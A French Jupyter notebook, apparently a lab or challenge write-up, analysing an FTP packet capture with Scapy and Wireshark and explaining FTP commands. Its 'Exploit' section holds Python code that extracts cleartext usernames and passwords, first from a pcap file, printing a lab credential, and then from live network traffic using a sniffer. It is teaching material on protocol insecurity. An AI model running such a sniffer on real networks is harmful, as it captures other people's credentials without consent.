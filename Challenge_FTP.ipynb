{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "54cce036-0608-4e80-805e-f9a69cb15880",
   "metadata": {},
   "source": [
    "# Challenge FTP"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d330d8c7-aa94-4c34-82f8-2a35cd6aa85d",
   "metadata": {},
   "source": [
    "Ce challenge a pour but d'annalysée et comprendre les trames FTP\n",
    "\n",
    "Pour commencer on importe bien évidemment la librairie \"Scapy\"."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "92030f1b-2679-42a5-ac3f-23a38807c846",
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "ftp = rdpcap(\"ftp-total.pcapng\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f7286010-aa09-4392-978f-480b3e654ace",
   "metadata": {},
   "source": [
    "## 1. Filtrage du Fichier"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "52ca4906-519e-43ba-8b65-ed67fe107942",
   "metadata": {},
   "source": [
    "Pour récupérer les trames FTP on peut uttilisée les ports. FTP est uttilisée uniquement depuis les ports **20** ou **21**\n",
    "On vérifie donc uniquement si le port **source** ou **destination** est le **20** ou **21**.\n",
    "\n",
    "On tape donc en filtre sur **Wireshark**\n",
    "\n",
    "`tcp.port == 21 or tcp.port == 20 || ftp`\n",
    "\n",
    "Cela nous affichie bien toute les trames FTP avec les SYN, SYN/ACK et ACK\n",
    "\n",
    "![](https://i.ibb.co/vvsNzhn4/Capture-d-cran-2025-06-01-005641.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "76b109de-c712-4403-80e4-0c2423a4373c",
   "metadata": {},
   "source": [
    "## 2. Analyse visuelle de la capture"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fac82bff-2827-44b3-808e-3f14a6b35802",
   "metadata": {},
   "source": [
    "Lorsque l'on regarde la capture FTP, on obtient plein d'information comme l'ip du serveur (**10.2.12.16**) ou aussi l'ip du client (**10.2.4.3**). On voit également plusieur noms de paquets comme USER, PASS, SYST, LIST et pleins d'autre.\n",
    "\n",
    "Voici la liste de certaine de ces requêtes applicative :\n",
    "\n",
    "* **USER** : Donne le nom d'uttilisateurs\n",
    "* **PASS** : Donne le mot-de-passe\n",
    "* **SYST** : Demande le système d'exploitation du serveur\n",
    "* **PORT** : Les 4 premier chiffre correspondent à l'adresse ip (ici 10,2,4,3) et les deux dernier corresponde a deux chiffre P1 et P2 permetant de faire un calcul qui donnera le port (*P1 * 256 + P2*)\n",
    "* **QUIT** : Permet de quitter la connexion"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5b444914-5fa1-4586-935f-de9898ab7e43",
   "metadata": {},
   "source": [
    "## 3. Extraction du fichier transféré"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "371aef98-1a89-44e8-97db-dc815521a9d0",
   "metadata": {},
   "source": [
    "Dans la connexion, un fichier y est transferée. On peut le récupérée de la manière suivante :\n",
    "\n",
    "* Allez dans `Fichier > Exporter Objet > FTP-DATA`\n",
    "* Cela devrez vous ouvrir un fenêtre contenant un fichier avec comme nom **ftpdoc.odt**\n",
    "* Faite `Enregistrer`\n",
    "\n",
    "Et voilà le fichier transfèrée vous appartient !"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "651dd5cf-c4b0-41a4-8e89-be83e328b8e2",
   "metadata": {},
   "source": [
    "## 4. Développement d’un “Exploit” en Python"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "521960a8-cb33-4df4-a611-a1af8e9d1ee6",
   "metadata": {},
   "source": [
    "Voici un code python qui regarde si il y a une connexion FTP qui se réalise\n",
    "\n",
    "Ce premier code permet de récupéré nom d'uttilisateur, mot-de-passe et l'addresse ip et le port du client depuis un fichier `.pcapng`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "65ebbac3-d212-409a-9fc4-285bf9cff06c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Nom d'utilisateur : touriste\n",
      "Mot de passe : 3aboqphie=3qbc!\n"
     ]
    }
   ],
   "source": [
    "def parse_ftp_from_pcapng(packets):\n",
    "\n",
    "    for pkt in packets:\n",
    "        # On filtre les paquets TCP contenant des données FTP\n",
    "        if pkt.haslayer(TCP) and (pkt[TCP].dport == 21 or pkt[TCP].sport == 21):\n",
    "            if Raw in pkt:\n",
    "                try:\n",
    "                    payload = pkt[Raw].load.decode('utf-8', errors='ignore')\n",
    "\n",
    "                    # Recherche des commandes FTP\n",
    "                    if \"USER\" in payload or \"PASS\" in payload:\n",
    "                        \n",
    "                        if \"USER\" in payload:\n",
    "                            user = re.search(r\"USER (.+?)\\r\\n\", payload)\n",
    "                            if user:\n",
    "                                print(f\"Nom d'utilisateur : {user.group(1)}\")\n",
    "\n",
    "                        if \"PASS\" in payload:\n",
    "                            passwd = re.search(r\"PASS (.+?)\\r\\n\", payload)\n",
    "                            if passwd:\n",
    "                                print(f\"Mot de passe : {passwd.group(1)}\")\n",
    "\n",
    "                except Exception as e:\n",
    "                    print(\"Erreur lors du traitement d’un paquet:\", e)\n",
    "\n",
    "parse_ftp_from_pcapng(ftp)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8bc1e5f2-8cb4-401b-94cb-4021e35597ab",
   "metadata": {},
   "source": [
    "Et voici le même code que ci-dessus mais qui regarde directement dans le réseaux"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0a0c6329-d168-4d0f-8597-d88f9ecf64d2",
   "metadata": {},
   "outputs": [],
   "source": [
    "def parse_ftp_packet(pkt):\n",
    "    if pkt.haslayer(TCP) and (pkt[TCP].dport == 21 or pkt[TCP].sport == 21):\n",
    "        if pkt.haslayer(Raw):\n",
    "            try:\n",
    "                payload = pkt[Raw].load.decode('utf-8', errors='ignore')\n",
    "\n",
    "                if \"USER\" in payload or \"PASS\" in payload or \"PORT\" in payload:\n",
    "\n",
    "                    if \"USER\" in payload:\n",
    "                        user = re.search(r\"USER (.+?)\\r\\n\", payload)\n",
    "                        if user:\n",
    "                            print(f\"Nom d'utilisateur : {user.group(1)}\")\n",
    "\n",
    "                    if \"PASS\" in payload:\n",
    "                        passwd = re.search(r\"PASS (.+?)\\r\\n\", payload)\n",
    "                        if passwd:\n",
    "                            print(f\"Mot de passe : {passwd.group(1)}\")\n",
    "\n",
    "            except Exception as e:\n",
    "                print(\"Erreur lors du traitement d’un paquet:\", e)\n",
    "\n",
    "# Lancer le sniff réseau\n",
    "print(\"Démarrage de l'écoute du trafic FTP sur le réseau...\")\n",
    "sniff(filter=\"tcp port 21\", prn=parse_ftp_packet, store=0)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [conda env:base] *",
   "language": "python",
   "name": "conda-base-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
